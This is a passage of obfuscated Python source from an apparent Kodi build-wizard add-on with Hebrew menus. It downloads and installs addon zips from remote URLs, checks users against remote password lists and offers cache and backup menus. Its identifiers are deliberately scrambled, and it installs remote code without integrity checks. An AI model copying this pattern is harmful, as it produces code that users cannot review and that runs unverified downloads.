		O00OOOOOOO0OOOOO0 =wiz .workingURL (O000O00O00O000OO0 )#line:2508
		if O00OOOOOOO0OOOOO0 ==True :#line:2509
			O00O00O0OO0O00OOO =wiz .openURL (O000O00O00O000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2510
			OOO00O00OO00O0OOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOO0O0OOOOOO00000 ).findall (O00O00O0OO0O00OOO )#line:2511
			if len (OOO00O00OO00O0OOO )>0 :#line:2512
				for OO0OO000OOO0000O0 ,O000O00O00O000OO0 ,O0OO0O0OO0OOOO000 ,O00000OOOOOOOOO0O ,O0O000O000O00OOOO ,OOOOOO0O00OO000O0 ,O000000O0OO000000 ,OOOO000O0000O00O0 ,O00000O0000OO0OO0 in OOO00O00OO00O0OOO :#line:2513
					if os .path .exists (os .path .join (ADDONS ,OOO0O0OOOOOO00000 )):#line:2514
						OOO00OOOO0O0O0OOO =['Launch Addon','Remove Addon']#line:2515
						O0OO0OO00OO000000 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOO00OOOO0O0O0OOO )#line:2516
						if O0OO0OO00OO000000 ==0 :#line:2517
							wiz .ebi ('RunAddon(%s)'%OOO0O0OOOOOO00000 )#line:2518
							xbmc .sleep (1000 )#line:2519
							return True #line:2520
						elif O0OO0OO00OO000000 ==1 :#line:2521
							wiz .cleanHouse (os .path .join (ADDONS ,OOO0O0OOOOOO00000 ))#line:2522
							try :wiz .removeFolder (os .path .join (ADDONS ,OOO0O0OOOOOO00000 ))#line:2523
							except :pass #line:2524
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO0O0OOOOOO00000 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2525
								removeAddonData (OOO0O0OOOOOO00000 )#line:2526
							wiz .refresh ()#line:2527
							return True #line:2528
						else :#line:2529
							return False #line:2530
					O0O0O00O0OOOO00OO =os .path .join (ADDONS ,O0OO0O0OO0OOOO000 )#line:2531
					if not O0OO0O0OO0OOOO000 .lower ()=='none'and not os .path .exists (O0O0O00O0OOOO00OO ):#line:2532
						wiz .log ("Repository not installed, installing it")#line:2533
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOO0O0OOOOOO00000 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OO0O0OO0OOOO000 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2534
							OOOO00OO0000O000O =wiz .parseDOM (wiz .openURL (O00000OOOOOOOOO0O ),'addon',ret ='version',attrs ={'id':O0OO0O0OO0OOOO000 })#line:2535
							if len (OOOO00OO0000O000O )>0 :#line:2536
								O00OO00OOO0OO0O0O ='%s%s-%s.zip'%(O0O000O000O00OOOO ,O0OO0O0OO0OOOO000 ,OOOO00OO0000O000O [0 ])#line:2537
								wiz .log (O00OO00OOO0OO0O0O )#line:2538
								if KODIV >=17 :wiz .addonDatabase (O0OO0O0OO0OOOO000 ,1 )#line:2539
								installAddon (O0OO0O0OO0OOOO000 ,O00OO00OOO0OO0O0O )#line:2540
								wiz .ebi ('UpdateAddonRepos()')#line:2541
								wiz .log ("Installing Addon from Kodi")#line:2543
								OO000OOO0OO00OO00 =installFromKodi (OOO0O0OOOOOO00000 )#line:2544
								wiz .log ("Install from Kodi: %s"%OO000OOO0OO00OO00 )#line:2545
								if OO000OOO0OO00OO00 :#line:2546
									wiz .refresh ()#line:2547
									return True #line:2548
							else :#line:2549
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0OO0O0OO0OOOO000 )#line:2550
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOO0O0OOOOOO00000 ,O0OO0O0OO0OOOO000 ))#line:2551
					elif O0OO0O0OO0OOOO000 .lower ()=='none':#line:2552
						wiz .log ("No repository, installing addon")#line:2553
						OOOO00OOO00OOOOO0 =OOO0O0OOOOOO00000 #line:2554
						O0O0OOO0OO0O0O00O =O000O00O00O000OO0 #line:2555
						installAddon (OOO0O0OOOOOO00000 ,O000O00O00O000OO0 )#line:2556
						wiz .refresh ()#line:2557
						return True #line:2558
					else :#line:2559
						wiz .log ("Repository installed, installing addon")#line:2560
						OO000OOO0OO00OO00 =installFromKodi (OOO0O0OOOOOO00000 ,False )#line:2561
						if OO000OOO0OO00OO00 :#line:2562
							wiz .refresh ()#line:2563
							return True #line:2564
					if os .path .exists (os .path .join (ADDONS ,OOO0O0OOOOOO00000 )):return True #line:2565
					OOOO000OO0O0OO00O =wiz .parseDOM (wiz .openURL (O00000OOOOOOOOO0O ),'addon',ret ='version',attrs ={'id':OOO0O0OOOOOO00000 })#line:2566
					if len (OOOO000OO0O0OO00O )>0 :#line:2567
						O000O00O00O000OO0 ="%s%s-%s.zip"%(O000O00O00O000OO0 ,OOO0O0OOOOOO00000 ,OOOO000OO0O0OO00O [0 ])#line:2568
						wiz .log (str (O000O00O00O000OO0 ))#line:2569
						if KODIV >=17 :wiz .addonDatabase (OOO0O0OOOOOO00000 ,1 )#line:2570
						installAddon (OOO0O0OOOOOO00000 ,O000O00O00O000OO0 )#line:2571
						wiz .refresh ()#line:2572
					else :#line:2573
						wiz .log ("no match");return False #line:2574
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2575
		else :wiz .log ("[Addon Installer] Text File: %s"%O00OOOOOOO0OOOOO0 )#line:2576
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2577
def installFromKodi (O00O0O0000O0OO000 ,over =True ):#line:2579
	if over ==True :#line:2580
		xbmc .sleep (2000 )#line:2581
	wiz .ebi ('RunPlugin(plugin://%s)'%O00O0O0000O0OO000 )#line:2583
	if not wiz .whileWindow ('yesnodialog'):#line:2584
		return False #line:2585
	xbmc .sleep (1000 )#line:2586
	if wiz .whileWindow ('okdialog'):#line:2587
		return False #line:2588
	wiz .whileWindow ('progressdialog')#line:2589
	if os .path .exists (os .path .join (ADDONS ,O00O0O0000O0OO000 )):return True #line:2590
	else :return False #line:2591
def installAddon (O0O0000O0OOOOO0OO ,OOOO00OO0O0OOO000 ):#line:2593
	if not wiz .workingURL (OOOO00OO0O0OOO000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0O0000O0OOOOO0OO ,COLOR2 ));return #line:2594
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2595
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0000O0OOOOO0OO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2596
	OOO0O000OO000O00O =OOOO00OO0O0OOO000 .split ('/')#line:2597
	O000O00000O0O00O0 =os .path .join (PACKAGES ,OOO0O000OO000O00O [-1 ])#line:2598
	try :os .remove (O000O00000O0O00O0 )#line:2599
	except :pass #line:2600
	downloader .download (OOOO00OO0O0OOO000 ,O000O00000O0O00O0 ,DP )#line:2601
	OO0O0O00OOO0OO0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0000O0OOOOO0OO )#line:2602
	DP .update (0 ,OO0O0O00OOO0OO0OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2603
	O0OOO0O0OOO0OO0OO ,OOOO000OOOOOOO0O0 ,O000OOO000O0OO000 =extract .all (O000O00000O0O00O0 ,ADDONS ,DP ,title =OO0O0O00OOO0OO0OO )#line:2604
	DP .update (0 ,OO0O0O00OOO0OO0OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2605
	installed (O0O0000O0OOOOO0OO )#line:2606
	installDep (O0O0000O0OOOOO0OO ,DP )#line:2607
	DP .close ()#line:2608
	wiz .ebi ('UpdateAddonRepos()')#line:2609
	wiz .ebi ('UpdateLocalAddons()')#line:2610
	wiz .refresh ()#line:2611
def installDep (OOOOO0O000000O0OO ,DP =None ):#line:2613
	O00000OO0000OOO00 =os .path .join (ADDONS ,OOOOO0O000000O0OO ,'addon.xml')#line:2614
	if os .path .exists (O00000OO0000OOO00 ):#line:2615
		OOO000000OOO00OOO =open (O00000OO0000OOO00 ,mode ='r');OOO00O0O000O0OO00 =OOO000000OOO00OOO .read ();OOO000000OOO00OOO .close ();#line:2616
		O000OOO0OOOOOO000 =wiz .parseDOM (OOO00O0O000O0OO00 ,'import',ret ='addon')#line:2617
		for OO00000OOOOO0O0O0 in O000OOO0OOOOOO000 :#line:2618
			if not 'xbmc.python'in OO00000OOOOO0O0O0 :#line:2619
				if not DP ==None :#line:2620
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00000OOOOO0O0O0 ))#line:2621
				wiz .createTemp (OO00000OOOOO0O0O0 )#line:2622
def installed (O00O00OOOO0OO0OO0 ):#line:2649
	OOO0OO0000OO00OOO =os .path .join (ADDONS ,O00O00OOOO0OO0OO0 ,'addon.xml')#line:2650
	if os .path .exists (OOO0OO0000OO00OOO ):#line:2651
		try :#line:2652
			O0OO0O0OOO0O0O0O0 =open (OOO0OO0000OO00OOO ,mode ='r');OOO000O0O000OO0OO =O0OO0O0OOO0O0O0O0 .read ();O0OO0O0OOO0O0O0O0 .close ()#line:2653
			O0O00OO000000O00O =wiz .parseDOM (OOO000O0O000OO0OO ,'addon',ret ='name',attrs ={'id':O00O00OOOO0OO0OO0 })#line:2654
			OOOO0000000O0OOO0 =os .path .join (ADDONS ,O00O00OOOO0OO0OO0 ,'icon.png')#line:2655
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00OO000000O00O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOOO0000000O0OOO0 )#line:2656
		except :pass #line:2657
def youtubeMenu (url =None ):#line:2659
	if not YOUTUBEFILE =='http://':#line:2660
		if url ==None :#line:2661
			O0000O0O0O000O0O0 =wiz .workingURL (YOUTUBEFILE )#line:2662
			O00O0O0OOO0O0O0OO =uservar .YOUTUBEFILE #line:2663
		else :#line:2664
			O0000O0O0O000O0O0 =wiz .workingURL (url )#line:2665
			O00O0O0OOO0O0O0OO =url #line:2666
		if O0000O0O0O000O0O0 ==True :#line:2667
			OO000O0O0O000000O =wiz .openURL (O00O0O0OOO0O0O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2668
			OOOOO0OOOOO0O000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO000O0O0O000000O )#line:2669
			if len (OOOOO0OOOOO0O000O )>0 :#line:2670
				for O0OOOOOO0O0000O0O ,O000O000O0000OOO0 ,url ,OOO0000OOO0OOOOO0 ,OO0O0O0O00OOOOO00 ,OO0O00OO0O0OOO000 in OOOOO0OOOOO0O000O :#line:2671
					if O000O000O0000OOO0 .lower ()=="yes":#line:2672
						addDir ("[B]%s[/B]"%O0OOOOOO0O0000O0O ,'youtube',url ,description =OO0O00OO0O0OOO000 ,icon =OOO0000OOO0OOOOO0 ,fanart =OO0O0O0O00OOOOO00 ,themeit =THEME3 )#line:2673
					else :#line:2674
						addFile (O0OOOOOO0O0000O0O ,'viewVideo',url =url ,description =OO0O00OO0O0OOO000 ,icon =OOO0000OOO0OOOOO0 ,fanart =OO0O0O0O00OOOOO00 ,themeit =THEME2 )#line:2675
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2676
		else :#line:2677
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2678
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2679
			addFile ('%s'%O0000O0O0O000O0O0 ,'',themeit =THEME3 )#line:2680
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2681
	setView ('files','viewType')#line:2682
def STARTP ():#line:2683
	OO00O0OOOOO000O0O =(ADDON .getSetting ("pass"))#line:2684
	if BUILDNAME =="":#line:2685
	 if not NOTIFY =='true':#line:2686
          O0OOO00OO00000OOO =wiz .workingURL (NOTIFICATION )#line:2687
	 if not NOTIFY2 =='true':#line:2688
          O0OOO00OO00000OOO =wiz .workingURL (NOTIFICATION2 )#line:2689
	 if not NOTIFY3 =='true':#line:2690
          O0OOO00OO00000OOO =wiz .workingURL (NOTIFICATION3 )#line:2691
	OO00O00O0O0O000O0 =OO00O0OOOOO000O0O #line:2692
	O0OOO00OO00000OOO =urllib2 .Request (SPEED )#line:2693
	OO0O000OO00O000OO =urllib2 .urlopen (O0OOO00OO00000OOO )#line:2694
	OO0OOOOOO0OOOO0O0 =OO0O000OO00O000OO .readlines ()#line:2696
	OOO000000O00OOO0O =0 #line:2700
	for O00OOO0O000O000O0 in OO0OOOOOO0OOOO0O0 :#line:2701
		if O00OOO0O000O000O0 .split (' ==')[0 ]==OO00O0OOOOO000O0O or O00OOO0O000O000O0 .split ()[0 ]==OO00O0OOOOO000O0O :#line:2702
			OOO000000O00OOO0O =1 #line:2703
			break #line:2704
	if OOO000000O00OOO0O ==0 :#line:2705
					O0O0OOOOOOOO00OOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2706
					if O0O0OOOOOOOO00OOO :#line:2708
						ADDON .openSettings ()#line:2710
						sys .exit ()#line:2712
					else :#line:2713
						sys .exit ()#line:2714
	return 'ok'#line:2718
def STARTP2 ():#line:2719
	OO0O0000O0OOOO00O =(ADDON .getSetting ("user"))#line:2720
	OOOOO0000OO0O0000 =(UNAME )#line:2722
	OOOO0OOOOOOOOO000 =urllib2 .urlopen (OOOOO0000OO0O0000 )#line:2723
	OOO0O0000O00OO00O =OOOO0OOOOOOOOO000 .readlines ()#line:2724
	OOOO00O0OOOOO000O =0 #line:2725
	for OO0O00000O0OOOOO0 in OOO0O0000O00OO00O :#line:2728
		if OO0O00000O0OOOOO0 .split (' ==')[0 ]==OO0O0000O0OOOO00O or OO0O00000O0OOOOO0 .split ()[0 ]==OO0O0000O0OOOO00O :#line:2729
			OOOO00O0OOOOO000O =1 #line:2730
			break #line:2731
	if OOOO00O0OOOOO000O ==0 :#line:2732
		OO0O000OO000OO0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2733
		if OO0O000OO000OO0O0 :#line:2735
			ADDON .openSettings ()#line:2737
			sys .exit ()#line:2740
		else :#line:2741
			sys .exit ()#line:2742
	return 'ok'#line:2746
def passandpin ():#line:2747
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2748
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2749
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2750
def passandUsername ():#line:2751
	ADDON .openSettings ()#line:2752
def folderback ():#line:2755
    O0000OO0OOOO00O00 =ADDON .getSetting ("path")#line:2756
    if O0000OO0OOOO00O00 :#line:2757
      O0000OO0OOOO00O00 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2758
      ADDON .setSetting ("path",O0000OO0OOOO00O00 )#line:2759
def backmyupbuild ():#line:2762
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2766
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2767
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2768
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2770
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2771
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2772
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2774
def maintMenu (view =None ):#line:2778
	OOOOOO00O00O0OO00 ='[B][COLOR green]ON[/COLOR][/B]';O0O0OO00O0OOOO00O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2780
	OO00000OOO00OOOOO ='true'if AUTOCLEANUP =='true'else 'false'#line:2781
	O00OOO0O0O0000OOO ='true'if AUTOCACHE =='true'else 'false'#line:2782
	OOOOOOOOO0OO00000 ='true'if AUTOPACKAGES =='true'else 'false'#line:2783
	OOOOOO0O000OOO00O ='true'if AUTOTHUMBS =='true'else 'false'#line:2784
	OOOOO0O000OO00OOO ='true'if SHOWMAINT =='true'else 'false'#line:2785
	O000O00000O000O00 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2786
	O00O0O0O0OO0O000O ='true'if INCLUDEALL =='true'else 'false'#line:2787
	OO00O0OO0OO0OOOOO ='true'if THIRDPARTY =='true'else 'false'#line:2788
	if wiz .Grab_Log (True )==False :O0OOOOOOO0OOO00O0 =0 #line:2789
	else :O0OOOOOOO0OOO00O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2790
	if wiz .Grab_Log (True ,True )==False :OOO00O00O00O0OO0O =0 #line:2791
	else :OOO00O00O00O0OO0O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2792
	O0000OOO0OOO0O000 =int (O0OOOOOOO0OOO00O0 )+int (OOO00O00O00O0OO0O )#line:2793
	O0OOOOO0OO0OOOO00 =str (O0000OOO0OOO0O000 )+' Error(s) Found'if O0000OOO0OOO0O000 >0 else 'None Found'#line:2794
	OO0000O000OOOO0O0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2795
	if O00O0O0O0OO0O000O =='true':#line:2796
		O0OO000000OO0OO00 ='true'#line:2797
		O00OO00OO0000O000 ='true'#line:2798
		O00OOOOOOOO000O0O ='true'#line:2799
		O0OO000OO00OO00O0 ='true'#line:2800
		OOOOOOO00O000OO00 ='true'#line:2801
		OOOOO00OOO0OO0O00 ='true'#line:2802
		OOO0000OOO0OO0000 ='true'#line:2803
		O0OOO0O0OO000OO0O ='true'#line:2804
	else :#line:2805
		O0OO000000OO0OO00 ='true'if INCLUDEBOB =='true'else 'false'#line:2806
		O00OO00OO0000O000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2807
		O00OOOOOOOO000O0O ='true'if INCLUDESPECTO =='true'else 'false'#line:2808
		O0OO000OO00OO00O0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2809
		OOOOOOO00O000OO00 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2810
		OOOOO00OOO0OO0O00 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2811
		OOO0000OOO0OO0000 ='true'if INCLUDESALTS =='true'else 'false'#line:2812
		O0OOO0O0OO000OO0O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2813
	OOO00O00O0OOO0OOO =wiz .getSize (PACKAGES )#line:2814
	OOO00O000O000OOOO =wiz .getSize (THUMBS )#line:2815
	OOOOO000O00OO00OO =wiz .getCacheSize ()#line:2816
	O0OOOOOOO0OOO0O00 =OOO00O00O0OOO0OOO +OOO00O000O000OOOO +OOOOO000O00OO00OO #line:2817
	OO00O000O0O0000O0 =['Daily','Always','3 Days','Weekly']#line:2818
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2819
	if view =="clean"or SHOWMAINT =='true':#line:2820
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOOOOOO0OOO0O00 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2821
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOO000O00OO00OO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2822
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO00O00O0OOO0OOO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2823
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO00O000O000OOOO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2824
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2825
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2826
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2827
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2828
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2829
	if view =="addon"or SHOWMAINT =='false':#line:2830
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2837
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2838
	if view =="misc"or SHOWMAINT =='true':#line:2839
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('View Errors in Log: %s'%(O0OOOOO0OO0OOOO00 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('Clear Wizard Log File%s'%OO0000O000OOOO0O0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2848
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2849
	if view =="backup"or SHOWMAINT =='true':#line:2850
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2862
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2863
	if view =="tweaks"or SHOWMAINT =='true':#line:2864
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2865
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		else :#line:2867
			if os .path .exists (ADVANCED ):#line:2868
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2869
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2870
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2876
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2877
	addFile ('Show All Maintenance: %s'%OOOOO0O000OO00OOO .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2878
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2879
	addFile ('Third Party Wizards: %s'%OO00O0OO0OO0OOOOO .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2880
	if OO00O0OO0OO0OOOOO =='true':#line:2881
		O00OOOOO0O0OOO0O0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2882
		O00OO00O0O00OO00O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2883
		O0O0000O00000OO0O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2884
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00OOOOO0O0OOO0O0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00OO00O0O00OO00O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O0000O00000OO0O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2887
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2888
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO00000OOO00OOOOO .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2889
	if OO00000OOO00OOOOO =='true':#line:2890
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO00O000O0O0000O0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2891
		addFile ('--- ניקוי קאש בהפעלה: %s'%O00OOO0O0O0000OOO .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2892
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOOOOOOOO0OO00000 .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2893
